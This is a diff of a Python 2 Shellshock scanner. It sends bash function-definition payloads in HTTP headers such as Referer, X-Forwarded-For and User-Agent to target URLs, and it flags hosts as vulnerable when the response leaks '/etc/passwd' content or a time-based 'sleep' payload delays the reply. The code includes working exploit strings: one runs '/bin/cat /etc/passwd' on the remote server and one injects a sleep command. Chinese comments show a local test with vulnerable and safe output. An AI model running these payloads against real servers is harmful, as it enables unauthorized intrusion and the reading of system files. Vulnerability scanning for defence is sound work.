@@ -14,7 +14,19 @@ beginNumber = 0
 waitTime = 0.0
 
 EXPLOIT1 = '() { :;};a=`/bin/cat /etc/passwd`;echo $a'
-EXPLOIT2 = '() { :;};sleep 12'
+SLEEP_TIME = 7
+EXPLOIT2 = '() { :;};sleep %s' % SLEEP_TIME
+
+#env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo
+#无漏洞的输出：
+#date
+#cat: echo: No such file or directory
+#
+#有漏洞的输出：
+#/bin/bash: X: line 1: syntax error near unexpected token `='
+#/bin/bash: X: line 1: `'
+#/bin/bash: error importing function definition for `X'
+#Fri Sep 26 17:07:25     2014
 
 def testBashShock1(url):
 	opener = urllib2.build_opener()
@@ -33,40 +45,68 @@ def testBashShock1(url):
 			if response.info().getheader('root'):
 				print
 				print 'PANIC!!!'
-				print '******* ' + url
+				print '******* [URL: %s], [Header: %s] [1]' % (url, 'X-Test')
 				print 'root:' + response.info().getheader('root')
 				return True
+			html = response.read()
+			if html.find('root:') != -1:
+				print
+				print 'PANIC!!!'
+				print '******* [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
+			 	return True
 			#for k, v in response.info().items():
 			#	print k + ': ', v
 	except Exception, e:
-	   print 'Exception: ', e
+		pass
+		#print 'Exception: ', e
 	return False
 
-def testBashShock2(url):
+TIMEBASED_TIMEOUT = 15
+def testBashShockByTime(url, header):
 	opener = urllib2.build_opener()
 	webutils.setupOpener(opener)
 	req = urllib2.Request(url)
+	webutils.setupRequest(req)
 	req.add_header('Proxy-Connection', 'keep-alive')
 	req.add_header('Cache-Control', 'max-age=0')
+
+	response, t1 = webutils.measureRequest(opener, req, TIMEBASED_TIMEOUT)
+	req.add_header(header,  EXPLOIT2)
+	response, t2 = webutils.measureRequest(opener, req, TIMEBASED_TIMEOUT)
+	if t2 >= SLEEP_TIME and t2 > t1 and t2 < TIMEBASED_TIMEOUT:
+		print
+		print 'PANIC!!!'
+		print '******* [URL: %s] [Header: %s]' % (url, header)
+		print
+		return True
+
+	"""
 	#req.add_header('X-Test', EXPLOIT2)
 	#req.add_header('User-Agent', EXPLOIT2)
 	#req.add_header('Referer',  EXPLOIT2)
-	req.add_header('X-Forwarded-For',  EXPLOIT2)
+
 	#print '******* ' + url + ' *******'
 	try:
 		t1 = time.time()
-		response = opener.open(req, timeout = 30)
+		response = opener.open(req, timeout = TIMEBASED_TIMEOUT)
 		t2 = time.time() - t1
-		if t2 >= 12 and t2 < 30:
-			print
-			print 'PANIC!!!'
-			print '******* ' + url
-			print
-			return True
+		if t2 >= SLEEP_TIME and t2 < TIMEBASED_TIMEOUT:
+			t1 = time.time()
+			response = opener.open(req, timeout = TIMEBASED_TIMEOUT)
+			t2 = time.time() - t1
+			if t2 >= SLEEP_TIME and t2 < TIMEBASED_TIMEOUT:
+				print
+				print 'PANIC!!!'
+				print '******* [URL: %s] [Header: %s]' % (url, header)
+				print
+				return True
 	except Exception, e:
-	   print 'Exception: ', e
+		pass
+		# print 'Exception: ', e
+	"""
 	return False
 
+"""
 def testBashShock3(url):
 	opener = urllib2.build_opener()
 	webutils.setupOpener(opener)
@@ -84,20 +124,23 @@ def testBashShock3(url):
 		t2 = time.time() - t1
 		if t2 >= 12 and t2 < 30:
 			print
-			print 'PANIC!!!'
+			print '[shock] PANIC!!!'
 			print '******* ' + url
 			print
 			return True
 	except Exception, e:
 	   print 'Exception: ', e
 	return False
+"""
 
 def scan(url, opener):
 	if testBashShock1(url):
 		return True
-	if testBashShock2(url):
+	if testBashShockByTime(url, 'Referer'):
 		return True
-	if testBashShock3(url):
+	if testBashShockByTime(url, 'X-Forwarded-For'):
+		return True
+	if testBashShockByTime(url, 'User-Agent'):
 		return True
 	return False
 
